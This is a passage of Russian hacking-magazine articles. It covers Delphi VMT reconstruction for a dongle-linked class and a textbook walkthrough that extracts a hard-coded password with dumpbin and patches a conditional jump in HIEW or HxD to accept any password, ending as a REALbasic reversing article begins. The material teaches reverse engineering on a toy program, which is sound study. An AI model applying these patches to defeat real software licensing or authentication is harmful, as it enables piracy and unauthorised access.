   {UserDefinedVirtuals: array[0..999] of procedure;}
  end;

Как видишь, она содержит исчерпывающую информацию о классе, в которой
нас в первую очередь интересуют его методы. Для понимания этого покурим
немного исходники IDR64.  Бегло просмотрев  их, находим два основных
модуля, ответственных за разбор кода на классы: Threads.cpp и Misc.cpp.
Первый содержит методы для поиска таблиц VMT в скомпилированном коде,
второй служит для извлечения информации из них. В двух словах коснусь
реализации этих процессов. В модуле Threads.cpp есть метод с соответству‐
ющим названием:


// Collect information from VMT structure
void __fastcall TAnalyzeThread::FindVMTs()
{
   ...
    if (Adj0Count > Adj24Count)
        Adjustment = 0;
    else
    {
        Adjustment = -24;
        Vmt.AdjustVmtConsts(Adjustment);
    }



    for (int i = 0; i < TotalSize && !Terminated; i += 8)
    {
        ...
        if (idr.IsFlagSet(cfCode | cfData, i)) continue;
        DWORD adr = *((ULONGLONG*)(Code + i));  // Points to
vmt0 (VmtSelfPtr)
        if (IsValidImageAdr(adr) && Pos2Adr(i) == adr + Vmt.
SelfPtr)
        {
            DWORD classVMT = adr;
...

Фактически он перебирает все 64-битные слова в файле, проверяя, указывает
ли каждое на самое себя (если его интерпретировать как адрес со смещением
+  Vmt.SelfPtr  (-0xBO)+  Adjustment  (-24)).  Например,  на  рисунке
выделенный красным длинный указатель по адресу 0x3A806F48 полностью
проходит данный магический тест,  поскольку его содержимое имеет вид
0x3A807010=0x3A806F48+0xB0+0x18.
   Этой особенностью, в частности, объясняется весьма неприятное тор‐
можение IDR при загрузке больших файлов.





Итак, найдя начало таблицы VMT, можно начинать разбирать ее содержимое.
Модуль Misc.cpp содержит множество методов для этого: GetParentAdr,
GetChildAdr,  GetClassSize,  GetClsName  и  так  далее.  Устроены  они,
в общем‑то, однотипно: в них выполняется обращение к соответствующим
полям структуры VMT относительно указателя Vmt.SelfPtr:


String __fastcall GetClsName(DWORD adr)
{
    if (!IsValidImageAdr(adr)) return "";


    DWORD vmtAdr = adr - Vmt.SelfPtr;
    DWORD pos = Adr2Pos(vmtAdr) + Vmt.ClassName;
...

Vmt.SelfPtr, Vmt.ClassName — это  константы  относительных смещений
до полей данной структуры, инициализирующихся в методах DelphiVmt::
SetVmtConsts и DelphiVmt::AdjustVmtConsts. Они зависят от версии Delphi,
и нам сильно повезло, что они не менялись с 2014 года. Проанализировав их,
составим схему блока VMT для класса, приведенного на предыдущем скрин‐
шоте:


SelfPtr         DQ  3A807010h
IntfTable       DQ  3A806f10h
AutoTable       DQ  0
InitTable       DQ  3A807010h
TypeInfo        DQ  3A807A10h ; TMkManager
FieldTable      DQ  3A80702Bh
MethodTable     DQ  3A80716Bh
DynamicTable        DQ  0
ClassName       DQ  3A8072D9h ; TMkManager
InstanceSize        DQ  0B8h
Parent          DQ  3A813848h
Equals          DQ  3A801080h
GetHashCode     DQ  3A801090h
ToString        DQ  3A8010B0h
SafeCallException   DQ  3A8010A0h
AfterConstruction   DQ  3A807B50h
BeforeDestruction   DQ  3A8012F0h
Dispatch        DQ  3A8010D0h
DefaultHandler      DQ  3A801300h
NewInstance     DQ  3A801020h
FreeInstance        DQ  3A807FE0h
Destroy         DQ  3A801030h

Как видим, раскладка 64-битной структуры вполне соответствует приведен‐
ному выше описанию. Не буду утомлять читателей подробным разбором
структуры  всяких  полезных  таблиц,  ссылки на которые можно получить
из содержимого полей. При желании ты можешь разобраться в этом сам, изу‐
чив исходники IDR. Тем более что в реальной жизни столь подробный разбор
кода обычно и не нужен, если только пользователь не желает написать свой
собственный декомпилятор покруче IDR. Рассмотрим практический способ
применения этой информации для анализа дельфовского кода без специаль‐
ных инструментов, прямо во время отладки приложения в нашем любимом
отладчике x64dbg.
   Итак, ковыряя приложение в этом отладчике, мы набрели на некий класс
TMkManager, ответственный за связь приложения с ключом MetroKey. Для наг‐
лядности: в classwiever IDR64 список методов данного класса выглядят при‐
мерно так.





Рассмотрим организацию этого класса в памяти загруженного в отладчик про‐
цесса на основе анализа таблицы MethodTable.





Красным цветом выделено имя класса TMkManager, синим — имена его
методов и их адреса, оранжевым — указатели на тип возвращаемого значения,
а фиолетовым — параметры каждого метода, их имена и типы. Как видишь,
значения возвращают только два из семи присутствующих на экране методов,
хотя параметры есть у всех (как минимум Self).
    Работает это так: допустим, в какой‑то момент мы при отладке процесса
зашли в процедуру по адресу 5E4AB020, и она нас так заинтересовала, что мы
решили узнать о ней подробности. Для этого мы ищем ссылку на нее. Простой
референс наверняка не найдется, а вот если искать его как последователь‐
ность байтов 20,B0,4A,5E,00,00,00,00, то будет найден указатель по адресу
5E4A72E6 (выделено синим).
  За ним следует строка со счетчиком, имя этого метода — GetKeyServerIP.
Если полученная информация заинтересовала нас еще сильнее, то следующий
указатель 5E4B3958 (выделено оранжевым) ссылается на другой указатель (в
нашем примере по стрелке 59913С0), который, в свою очередь, указывает
на имя типа возвращаемого значения — string.
   Двигаясь дальше, мы обнаруживаем выделенное фиолетовым имя первого
параметра этого метода Self и указатель на его тип — 5E4A7A08. Так же как и
в предыдущем случае, через два переименования мы выходим на имя типа,
точнее, класса — искомый TMkManager, который по понятным причинам явля‐
ется родительским классом и для нашего метода.
  На скриншоте видно, что если продолжить изыскания, то можно пройти
по цепочке порождающих классов, но я предоставлю читателю, воодушев‐
ленному  полученной  информацией,  самому  развить  эту  тему,  вплоть
до написания собственных скриптов или даже декомпиляторов.
ВЗЛОМ





      УЧИМСЯ АНАЛИЗИРОВАТЬ
       ПРОГРАММЫ ДЛЯ X86-64
             С НУЛЯ





                            Крис Касперски         Юрий Язев
                             Известный российский     Широко известен под
                                    хакер. Легенда ][, ex-      псевдонимом yurembo.
                            редактор ВЗЛОМа. Также  Программист, разработчик
                                  известен под         видеоигр, независимый
                            псевдонимами мыщъх,     исследователь. Старый
                              nezumi (яп. 鼠, мышь), n2k,   автор журнала «Хакер».
                                   elraton, souriz, tikus, muss,    yazevsoft@gmail.com
                                       farah, jardon, KPNC.



Исследование  исполняемого  файла  можно  разделить
на три  этапа: поверхностный, глубокий, хирургический.
На первом мы малыми силами собираем информацию
о подопытном файле. Под «малыми силами» я подразуме‐
ваю легкие в использовании и широко распространенные
средства анализа. В этой статье мы поговорим о них и для
наглядности взломаем несложную защиту.


«Фундаментальные основы хакерства»
Мы публикуем эту статью в честь начала предзаказов обновленной версии кни‐
ги Криса Касперски «Фундаментальные основы хакерства», получившей под‐
заголовок «Анализ программ в среде Win64».
  В первой части статьи ты вкратце познакомишься с основными инструмен‐
тами отладки, а вторая — это отрывок из  книги. Он уже публиковался
в «Хакере», но теперь доступен без платной подписки.
   Купить книгу ты можешь на сайте издательства «Солон‑пресс».
   Примечание: Текст статьи обновлен с учетом работы с x86-64.



ЭТАП 1

Если работа ведется в Linux, среди инструментов поверхностного анализа
можно отметить такие приложения:
 • file определяет тип файла, анализируя его поля;
 • readelf отображает информацию о секциях файла;
 • ldd выводит список динамических библиотек, от которых зависит данный
   исполняемый файл;
 • nm выводит список декорированных имен функций, которые создаются
   компиляторами языков, поддерживающих перегрузку функций. Затем ути‐
   лита может декодировать эти имена;
 • c++filt преобразует декорированные имена функций в первоначальные
   с учетом передаваемых и получаемых аргументов;
 • strings выводит строки, содержащиеся в файле, с учетом заданного шаб‐
   лона.

В Windows со многими из этих задач справляется утилита dumpbin , входящая
в поставку Visual Studio.
   Если мы получили общее представление о файле и не нашли ничего полез‐
ного для взлома, есть смысл переходить к следующему этапу.


ЭТАП 2

Второй этап — это дизассемблирование. Его цель — обнаружить защитный
механизм. Существует два вида дизассемблирования: статическое и динами‐
ческое (более известное как отладка или трассировка). В первом случае изу‐
чается дизассемблерный код, полученный с помощью автоматического ана‐
лиза дизассемблером исполняемого файла без его запуска.
   Динамическое дизассемблирование предполагает запуск программы и ее
пошаговое исполнение. Обычно отладка проходит в специальной и обособ‐
ленной среде. Это нужно на случай, если программа представляет какую‑то
угрозу для системы.
  В качестве отладчика в Linux можно воспользоваться старым добрым GDB
либо средствами трассировки в Radare2 . В Windows выбор тоже невелик:
OllyDbg постепенно устаревает и не обновляется. В нем отлаживать приложе‐
ния можно только в режиме пользователя. После смерти SoftICE единствен‐
ным нормальным отладчиком в Windows стал WinDbg. В нем можно отла‐
живать драйверы на уровне ядра.
   Статические  дизассемблеры тоже  делятся на две  группы:  линейные
и рекурсивные. Первые перебирают все сегменты кода в двоичном файле,
декодируют и преобразуют их в мнемоники языка ассемблера. Так работает
большинство простых дизассемблеров, включая objdump и dumpbin . Может
показаться, что так и должно быть. Однако, когда среди исполняемого кода
встречаются  данные,  возникает  проблема:  их не надо  преобразовывать
в команды, но линейный дизассемблер не в состоянии отличить их от кода!
Мало того, после того как сегмент данных завершится, дизассемблер будет
рассинхронизирован с текущей позиции кода.
  С  другой  стороны,  рекурсивные  дизассемблеры,  такие  как  IDA  Pro,
Radare2 и Ghidra, ведут себя иначе. Они дизассемблируют код в той же пос‐
ледовательности, в которой его будет исполнять процессор. Поэтому они акку‐
ратно обходят данные, и в результате большинство команд благополучно рас‐
познается.
  Но и здесь есть ложка дегтя. Не все косвенные переходы легко отследить.
Следовательно, какие‑то пути выполнения могут остаться нераспознанными.
Помогает то, что современные дизассемблеры применяют разные эвристичес‐
кие приемы с учетом конкретных компиляторов.


ЭТАП 3

Когда адрес защитного механизма найден, можно приступать к третьему эта‐
пу — хирургическому. Существует несколько видов непосредственного взло‐
ма. Самый простой вариант — воспользоваться шестнадцатеричным редак‐
тором.
   Существует множество HEX-редакторов на любой вкус и цвет, например
010 Editor, HexEdit, HIEW . Вооружайся одним из них, и тебе останется
только перезаписать команду по найденному адресу. Но в двоичном файле
сильно не разбежишься! Существующий код не дает простора для манипу‐
ляций, поэтому нам приходится умещаться в имеющемся пространстве.
   Противопоказано раздвигать или сдвигать команды, даже выкидывать име‐
ющиеся конструкции можно только с большой осторожностью. Ведь подобные
манипуляции с кодом приведут к сдвигу смещений остальных команд, а ука‐
затели в таком случае будут указывать в космос!
  Этим способом, однако, можно хакнуть большое количество защитных
механизмов. А как быть, если надо не просто взломать программу, а добавить
или заменить в ней какие‑то функции? Понятно, что HEX-редактор тут тебе
не друг.
   Здесь на помощь приходит техника оснащения двоичного файла. Оно поз‐
воляет вставить почти неограниченный блок кода почти в любое место файла.
Понятно, что без посторонних средств этого не добиться. Оснащение реали‐
зуют специальные библиотеки, предоставляющие гибкие API.
  С помощью статического оснащения производится модификация файла
непосредственно на диске. То есть бинарный файл сначала надо дизассем‐
блировать, найти подходящее место, обладающее достаточным пространс‐
твом для включения полезной нагрузки, и, внедряя потусторонний код, усле‐
дить, чтобы не поломались указатели на код и данные. В этом деле призваны
помочь такие инструменты, как DynInst и PEBIL . После модификации файла
он записывается в измененном виде обратно на диск.
   Динамическое  оснащение  работает  по  другому  принципу.  Подобно
отладчикам движки динамического оснащения следят за выполняемыми про‐
цессами и вносят код прямо в память. Поэтому при динамическом оснащении
не нужно ни дизассемблирование, ни изменение бинарника, от чего одним
махом исчезают все негативные последствия.
   Однако во время динамического оснащения, так как программа выполняет‐
ся «под наблюдением», ее производительность заметно падает. Для динами‐
ческого оснащения используются системы DynamoRIO (совместный проект
HP и MIT) и Pin (Intel).
   Может показаться, что динамическое оснащение лучше во всех отношени‐
ях. А вот и нет! Такую программу нельзя будет исполнить на другом компьюте‐
ре, где нет никаких специальных средств. Тогда как в процессе статического
оснащения мы заранее готовим бинарник и передаем его пользователю. Теми
же средствами могут пользоваться и злоумышленники, желающие заразить
программу вирусом или снабдить какой‑то подлой функцией.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
          УЧИМСЯ АНАЛИЗИРОВАТЬ ПРОГРАММЫ ДЛЯ
                                                X86-64
                                  С НУЛЯ





ПРАКТИЧЕСКИЙ ВЗЛОМ

Чтобы поупражняться на практике, проведем анализ и раскусим элементарную
защиту.


Шаг первый. Разминочный
Алгоритм простейшего механизма аутентификации заключается в посимволь‐
ном сравнении введенного пользователем пароля с эталонным значением,
хранящимся либо в самой программе (как часто и бывает), либо вне ее, нап‐
ример в конфигурационном файле или реестре (что встречается реже).
   Достоинство такой защиты — крайне простая программная реализация. Ее
ядро состоит фактически из нескольких строк, которые на языке С/C++ можно
записать так:


if (strcmp(введенный пароль, эталонный пароль))
{/* Пароль неверен */}
else
{/* Пароль ОК*/}

Давай дополним этот код процедурами запроса пароля и вывода результатов
сравнения, а затем испытаем полученную программу на прочность,  т.  е.
на стойкость к взлому. В Visual Studio создай консольный проект и ском‐
пилируй следующий код, установив целевую платформу x64.
   Пример простейшей системы аутентификации:


#include "stdafx.h"
// Простейшая система аутентификации
// Посимвольное сравнение пароля
#include <stdio.h>
#include <string.h>
#define PASSWORD_SIZE 100
#define PASSWORD "myGOODpassword\n"
// Этот перенос нужен затем, чтобы
// не выкусывать перенос из строки,
// введенной пользователем
int main()
{
// Счетчик неудачных попыток аутентификации
int count=0;
// Буфер для пароля, введенного пользователем
char buff[PASSWORD_SIZE];
// Главный цикл аутентификации
for(;;)
{
// Запрашиваем и считываем пользовательский пароль
printf("Enter password:");
fgets(&buff[0],PASSWORD_SIZE,stdin);
// Сравниваем оригинальный и введенный пароль
if (strcmp(&buff[0],PASSWORD))
// Если пароли не совпадают — «ругаемся»
printf("Wrong password\n");
// Иначе (если пароли идентичны)
// выходим из цикла аутентификации
else break;
// Увеличиваем счетчик неудачных попыток
// аутентификации и, если все попытки
// исчерпаны, завершаем программу
if (++count>3) return -1;
}
// Раз мы здесь, то пользователь ввел правильный пароль
printf("Password OK\n");
}

В популярных кинофильмах крутые хакеры легко проникают в любые жутко
защищенные системы, каким‑то непостижимым образом угадывая искомый
пароль с нескольких попыток. Почему бы не попробовать пойти их путем?
  Не так уж редко пароли представляют собой осмысленные слова наподо‐
бие Ferrari, QWERTY, имена любимых хомячков, названия географических пун‐
ктов и т. д. Угадывание пароля сродни гаданию на кофейной гуще — никаких
гарантий на успех нет, остается рассчитывать на одно лишь везение. А удача,
как известно, птица гордая — палец в рот ей не клади. Нет ли более надежного
способа взлома?
   Раз эталонный пароль хранится в теле программы, то, если он не зашиф‐
рован каким‑нибудь хитрым образом, его можно обнаружить тривиальным
просмотром двоичного кода программы. Перебирая все встретившиеся в ней
текстовые строки, начиная с тех, что больше всего смахивают на пароль, мы
очень быстро подберем нужный ключ и откроем им программу! Причем
область просмотра можно существенно сузить — в подавляющем большинс‐
тве случаев компиляторы размещают все инициализированные переменные
в сегменте данных (в PE-файлах он размещается в секции .data или .rdata).
Исключение составляют, пожалуй, ранние компиляторы Borland с их мани‐
акальной любовью всовывать текстовые строки в сегмент кода — непосредс‐
твенно по месту их вызова. Это упрощает сам компилятор, но порождает мно‐
жество проблем. Современные операционные системы, в отличие от старушки
MS-DOS, запрещают модификацию кодового сегмента, и все размещенные
в нем переменные доступны лишь для чтения. К тому же на процессорах с раз‐
дельной системой кеширования они «засоряют» кодовый кеш, попадая туда
при упреждающем чтении, но при первом же обращении к ним вновь загружа‐
ются из медленной оперативной памяти в кеш данных. В результате — тор‐
моза и падение производительности.
   Что ж, пусть это будет секция данных! Остается только найти удобный инс‐
трумент для просмотра двоичного файла. Можно, конечно, нажать клавишу
F3 в своей любимой оболочке (FAR, DOS Navigator) и, придавив кирпичом Page
Down, любоваться бегущими циферками до тех пор, пока не надоест.
   Можно воспользоваться любым HEX-редактором (qView, HIEW... — кому
какой по вкусу), но в данном случае, по соображениям наглядности, приведен
результат работы утилиты dumpbin из штатной поставки Microsoft Visual Studio.
Запустить dumpbin можно из Developer Command Prompt или другой консоли.
   Натравим утилиту на исполняемый файл нашей программы, содержащей
пароль, и попросим ее распечатать содержащую только для чтения инициали‐
зированные данные секцию — rdata (ключ /SECTION:.rdata) в «сыром» виде
(ключ /RAWDATA:BYTES), указав значок > для перенаправления вывода в файл
(ответ программы занимает много места, и на экране помещается один лишь
«хвост»).


dumpbin /RAWDATA:BYTES /SECTION:.rdata passCompare1.exe > rdata.
txt


0000000140002240: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00  ................
0000000140002250: 40 40 00 40 01 00 00 00 E0 40 00 40 01 00 00
00  @@.@....□@.@....
0000000140002260: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
FF □□□□□□□□□□□□□□□□
0000000140002270: 45 6E 74 65 72 20 70 61 73 73 77 6F 72 64 3A 00
 Enter password:.
0000000140002280: 6D 79 47 4F 4F 44 70 61 73 73 77 6F 72 64 0A 00
 myGOODpassword..
0000000140002290: 57 72 6F 6E 67 20 70 61 73 73 77 6F 72 64 0A 00
 Wrong password..
00000001400022A0: 50 61 73 73 77 6F 72 64 20 4F 4B 0A 00 00 00 00
 Password OK.....
00000001400022B0: 40 01 00 00 00 00 00 00 00 00 00 00 00 00 00
00  @...............
00000001400022C0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00  ................

Среди всего прочего тут есть одна строка, до боли похожая на эталонный
пароль. Испытаем ее? Впрочем, какой смысл — судя по исходному тексту
программы, это действительно искомый пароль, открывающий защиту, словно
золотой ключик. Слишком уж видное место выбрал компилятор для его хра‐
нения — пароль не мешало бы запрятать и получше.
  Один из способов сделать это — насильно поместить эталонный пароль
в собственноручно выбранную нами секцию. Такая возможность не предус‐
мотрена стандартом, и потому каждый  разработчик  компилятора  (строго
говоря, не компилятора, а линкера, но это не суть важно) волен реализовывать
ее по‑своему или не реализовывать вообще. В Microsoft Visual C++ для этой
цели предусмотрена специальная прагма data_seg, указывающая, в какую
секцию помещать следующие  за ней  инициализированные  переменные.
Неинициализированные переменные по умолчанию располагаются в секции .
bss и управляются прагмой bss_seg соответственно.
  В примере аутентификации выше перед функцией main добавим новую
секцию, в которой будем хранить наш пароль (для удобства я создал отдель‐
ный проект — passCompare2):


// С этого момента все инициализированные
// переменные будут размещаться в секции .kpnc
#pragma data_seg(".kpnc")
#define PASSWORD_SIZE 100
#define PASSWORD "myGOODpassword\n"
char passwd[] = PASSWORD;
#pragma data_seg()

Внутри функции main проинициализируем массив:


// Теперь все инициализированные переменные
// вновь будут размещаться в секции по умолчанию,
// т. е. .rdata
char buff[PASSWORD_SIZE]="";

Немного изменилось условие сравнения строк в цикле:


if (strcmp(&buff[0],&passwd[0]))

Натравим утилиту dumpbin на новый исполняемый файл:


dumpbin /RAWDATA:BYTES /SECTION:.rdata passCompare2.exe > rdata.
txt


0000000140002230: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00  ................
0000000140002240: 40 30 00 40 01 00 00 00 E0 30 00 40 01 00 00
00  @0.@....□0.@....
0000000140002250: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
FF  □□□□□□□□□□□□□□□□
0000000140002260: 45 6E 74 65 72 20 70 61 73 73 77 6F 72 64 3A 00
 Enter password:.
0000000140002270: 57 72 6F 6E 67 20 70 61 73 73 77 6F 72 64 0A 00
 Wrong password..
0000000140002280: 50 61 73 73 77 6F 72 64 20 4F 4B 0A 00 00 00 00
 Password OK.....
0000000140002290: 40 01 00 00 00 00 00 00 00 00 00 00 00 00 00
00  @...............
00000001400022A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00  ................

Ага, теперь в секции данных пароля нет и хакеры «отдыхают»! Но не спеши
с выводами. Давай сначала выведем на экран список всех секций, имеющихся
в файле:


dumpbin passCompare2.exe


Summary
  1000 .data
  1000 .kpnc
  1000 .pdata
  1000 .reloc
  1000 .rsrc
  1000 .text

Нестандартная секция .kpnc сразу же приковывает к себе внимание. А ну‑ка
посмотрим, что там в ней.


dumpbin /SECTION:.kpnc /RAWDATA passCompare2.exe


RAW DATA #5
0000000140005000: 6D 79 47 4F 4F 44 70 61 73 73 77 6F 72 64 0A 00
 myGOODpassword..

Вот  он,  пароль!  Спрятали,  называется...  Можно,  конечно,  извратиться
и засунуть секретные данные в секцию неинициализированных данных (.bss)
или даже секцию кода (.text) — не все там догадаются поискать, а работос‐
пособность программы такое размещение не нарушит. Но не стоит забывать
о возможности автоматизированного поиска текстовых строк в двоичном фай‐
ле. В какой бы секции ни содержался эталонный пароль, фильтр без труда его
найдет (единственная проблема — определить, какая из множества текстовых
строк представляет собой искомый ключ; возможно, потребуется перебрать
с десяток‑другой потенциальных кандидатов).


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
          УЧИМСЯ АНАЛИЗИРОВАТЬ ПРОГРАММЫ ДЛЯ
                                                X86-64
                                  С НУЛЯ





ШАГ ВТОРОЙ. ЗНАКОМСТВО С ДИЗАССЕМБЛЕРОМ

Пароль мы узнали. Но как же утомительно вводить его каждый раз с клавиату‐
ры перед запуском программы! Хорошо бы ее хакнуть так, чтобы никакой
пароль вообще не запрашивался или любой введенный пароль программа вос‐
принимала как правильный.
   Хакнуть, говорите?! Что ж, это несложно! Куда проблематичнее опре‐
делиться, чем именно ее хакать. Инструментарий хакеров чрезвычайно раз‐
нообразен, чего тут  только нет: и  дизассемблеры, и  отладчики, и  API-,
и message-шпионы, и мониторы обращений к файлам (портам, реестру), и рас‐
паковщики исполняемых файлов, и... Сложновато начинающему кодокопателю
со всем этим хозяйством разобраться!
   Впрочем, шпионы, мониторы, распаковщики — второстепенные утилиты
заднего плана, а основное оружие взломщика — отладчик (динамический
дизассемблер) и дизассемблер (статический).
   Итак,  дизассемблер применим  для  исследования  откомпилированных
программ и частично пригоден для анализа псевдокомпилированного кода.
Раз   так,  он   должен   подойти  для   вскрытия   парольной  защиты
passCompare1.exe. Весь вопрос в том, какой дизассемблер выбрать.
  Не все дизассемблеры одинаковы. Есть среди них и «интеллектуалы», авто‐
матически распознающие многие конструкции, как то: прологи и эпилоги фун‐
кций, локальные переменные, перекрестные ссылки и т. д., а есть и «прос‐
таки», чьи способности ограничены одним лишь переводом машинных команд
в ассемблерные инструкции.
   Логичнее всего воспользоваться услугами дизассемблера‑интеллектуала
(если он есть), но... давай не будем спешить, а попробуем выполнить весь
анализ вручную. Техника, понятное дело, штука хорошая, да вот не всегда она
оказывается под рукой, и неплохо бы заранее научиться работе в полевых
условиях. К тому же общение с плохим дизассемблером как нельзя лучше под‐
черкивает «вкусности» хорошего.
   Воспользуемся уже знакомой нам утилитой dumpbin, настоящим «швейцар‐
ским ножиком» со множеством полезных функций, среди которых притаился
и дизассемблер. Дизассемблируем секцию кода (как мы помним, носящую
имя .text), перенаправив вывод в файл, так как на экран он, очевидно,
не поместится:


dumpbin /SECTION:.text /DISASM passCompare1.exe > code-text.txt

Заглянем еще раз в секцию данных (или в другую — в зависимости от того, где
хранится пароль).
   Запомним найденный пароль: myGOODpassword. В зависимости от версии
и  настроек  дизассемблера  dumpbin  инициализированные  переменные,
к которым обращается код, могут быть представлены по‑разному: на их месте
могут быть или символьные константы, или непосредственно шестнадцатерич‐
ное смещение. Попробуем найти выявленный ранее пароль в дизассембли‐
рованном листинге тривиальным контекстным поиском с помощью любого
текстового редактора.


00000001400010B2: 48 8D 15 C7 11 00  lea         rdx, [??_C@_
0BA@PCMCJPMK@myGOODpassword?6@]
                    00
00000001400010B9: 48 8D 4C 24 20     lea         rcx,[rsp+20h]
00000001400010BE: E8 8C 0D 00 00     call        strcmp
00000001400010C3: 85 C0              test        eax,eax
00000001400010C5: 74 58              je          000000014000111F

Есть совпадение! Центральная часть этого листинга — вызов функции strcmp.
В качестве параметров ей передаются две строки, размещенные в регистрах
RCX и RDX. Как мы видим, в первой строке листинга в RDX помещается эталон‐
ный пароль, а во второй строке в регистр RCX копируется значение из локаль‐
ной переменной — очевидно, строка, введенная пользователем.
  В результате выполнения, если строки равны, функция strcmp возвра‐
щает 0 в регистре RAX или EAX, как в данном случае. Если же строки различа‐
ются, возвращается значение, отличающееся от нуля.
  В  следующей  строке  листинга  инструкция test  проверяет  значение
в регистре EAX на равенство нулю. Если ответ положительный, что может про‐
изойти, только когда строки одинаковые, флаг ZF устанавливается в единицу.
   Следующая инструкция JE осуществляет переход по указанному адресу
только в том случае, когда флаг ZF равен единице. Посмотрим, на какой код
указывает этот адрес:


000000014000111F: 48 8D 0D 7A 11 00  lea         rcx, [??_C@_
0N@MBEFNJID@Password?5OK?6@]
                    00
0000000140001126: E8 E5 FE FF FF     call        printf

Это код вывода строки Password OK. В регистр RCX помещается указанная
строка, затем значение этого регистра передается функции printf, которая
выводит переданную строку на экран. Из этого следует, что перед нами валид‐
ная ветвь программы.
   Рассмотрим обратный исход, когда строки различаются, strcmp возвра‐
щает ненулевое значение, флаг ZF остается сброшенным (равным нулю)
и переход не осуществляется. Тогда мы проваливаемся в такой код:


00000001400010C7: 66 0F 1F 84 00 00  nop         word
ptr [rax+rax]
                    00 00 00
00000001400010D0: 48 8D 0D B9 11 00  lea         rcx, [??_C@_
0BA@EHHIHKNJ@Wrong?5password?6@]
                    00
00000001400010D7: E8 34 FF FF FF     call        printf

Он выводит строку о неправильном пароле — тоже с помощью функции
printf, в параметре принимающей строку для отображения.
   Оперативные соображения следующие: если команду JE заменить JNE, то
программа отвергнет истинный пароль как неправильный, а любой неправиль‐
ный пароль воспримет как истинный. А если TEST EAX,EAX заменить XOR EAX,
EAX, то после исполнения этой команды регистр EAX будет всегда равен нулю,
какой бы пароль ни вводился.
   Дело за малым —  найти эти самые  байтики в исполняемом  файле
и малость подправить их.


ХИРУРГИЧЕСКОЕ ВМЕШАТЕЛЬСТВО

Как мы обсуждали выше, внесение изменений непосредственно в исполня‐
емый файл — дело серьезное. Стиснутым существующим кодом, нам при‐
ходится довольствоваться только тем, что есть, и ни раздвинуть команды,
ни даже сдвинуть их, выкинув из защиты «лишние запчасти», не получится.
Ведь это привело бы к сдвигу смещений всех остальных команд, тогда как зна‐
чения указателей и адресов переходов остались бы без изменений и стали бы
указывать совсем не туда, куда нужно!
   Ну, с «выкидыванием запчастей» справиться как раз таки просто — дос‐
таточно забить код командами NOP (опкод которой 0x90, а вовсе не 0x0,
как почему‑то думают многие начинающие кодокопатели), т. е. пустой опе‐
рацией (вообще‑то NOP — это просто другая форма записи инструкции XCHG
EAX,EAX, если интересно). С «раздвижкой» куда сложнее! К счастью, в PE-фай‐
лах  всегда  присутствует  множество «дыр», оставшихся от выравнивания,
в них‑то и можно разместить свой код или свои данные.
  Но не проще ли просто откомпилировать ассемблированный файл, пред‐
варительно внеся в него требуемые изменения? Нет, не проще, и вот почему:
если ассемблер не распознает указатели, передаваемые функции (а как мы
видели, наш дизассемблер не смог отличить их от констант), он, соответствен‐
но, не позаботится должным образом их скорректировать, и, естественно,
программа работать не будет.
   Приходится резать программу вживую. Легче всего это делать с помощью
утилиты HIEW, которая «переваривает» PE-формат файлов и упрощает тем
самым поиск нужного фрагмента. Обрати внимание, так как мы работаем
в 64-битной среде, подойдет только одна из новых версий программы с под‐
держкой файлов PE32+. Например, я использую версию 8.67, прекрасно ужи‐
вающуюся с Windows 10. Запустим ее, указав имя файла в командной строке
(hiew32 passCompare1.exe), двойным нажатием клавиши Enter, переключим‐
ся в режим ассемблера и при помощи клавиши F5 перейдем к требуемому
адресу. Как мы помним, команда TEST, проверяющая результат на равенство
нулю, располагалась по адресу 0x1400010C3.
   Чтобы HIEW мог отличить адрес от смещения в самом файле, предварим
его символом точки: .1400010C3.


00000001400010C3: 85 C0              test        eax,eax
00000001400010C5: 74 58              je          000000014000111F

Ага, как раз то, что нам надо! Нажмем клавишу F3 для перевода HIEW в режим
правки, подведем курсор к команде TEST EAX, EAX и, нажав клавишу Enter,
заменим ее командой XOR EAX,EAX.


00000001400010C3: 31 C0              xor         eax,eax
00000001400010C5: 74 58              je          000000014000111F





             HIEW в режиме правки ассемблерной команды

С удовлетворением заметив, что новая команда в аккурат вписалась в пре‐
дыдущую, нажмем клавишу F9 для сохранения изменений на диске, а затем
выйдем из HIEW и попробуем запустить программу, вводя первый пришедший
на ум пароль:


>passCompare1
Enter password:Привет, шляпа!
Password OK

Получилось! Защита пала! Хорошо, а как бы мы действовали, если бы у нас
не было HIEW?  Тогда,  вооружившись каким‑нибудь  шестнадцатеричным
редактором (например, HxD), пришлось бы прибегнуть к контекстному поиску.
   Загрузим подопытный файл в редактор. Конечно, если пытаться найти пос‐
ледовательность 85 C0 — код команды TEST EAX, EAX, ничего хорошего
из этого не выйдет — этих самых «тестов» в программе может быть несколько
сотен, а то и больше. А вот адрес перехода, скорее всего, во всех ветках прог‐
раммы различен, и подстрока TEST EAX,EAX/je 000000014000111F имеет
хорошие шансы на уникальность. Попробуем найти в файле соответствующий
ей код: 85 C0 74 58. В HxD для этого надо нажать Ctrl-F, чтобы открыть окно
поиска, затем перейти на вкладку «Hex-значения» и искать уже отсюда.
   Оп‑с! Найдено только одно вхождение, что нам, собственно, и нужно.
Давай теперь попробуем модифицировать файл непосредственно в HEX-
режиме, не переходя в ассемблер. Возьмем себе на заметку: инверсия млад‐
шего бита кода команды приводит к изменению условия перехода на противо‐
положное, т. е. 74 JE → 75 JNE. Подведи курсор к значению 74 и введи 75.
Значение будет выделено красным. Далее надо сохранить результат работы.
Готово!





               Правка шестнадцатеричного кода с помощью HxD





               Взломанная программа принимает любые пароли

Работает? В смысле защита свихнулась окончательно — не признает истинные
пароли, зато радостно приветствует остальные. Замечательно!
ВЗЛОМ





       РЕВЕРСИМ ПРИЛОЖЕНИЕ
           НА REALBASIC





Помнишь,   как  на   школьных   уроках
информатики  тебя  заставляли  изучать
Basic? Так вот: это был ненастоящий Basic.
А настоящий, то есть REALbasic, теперь
называется Mojo Xojo, и на нем до сих пор            МВК
пишут  приложения. Сегодня я  расскажу
тебе, как они устроены изнутри и как их
можно взломать.


Часто реверсить программный продукт сложно не потому, что его код запутан
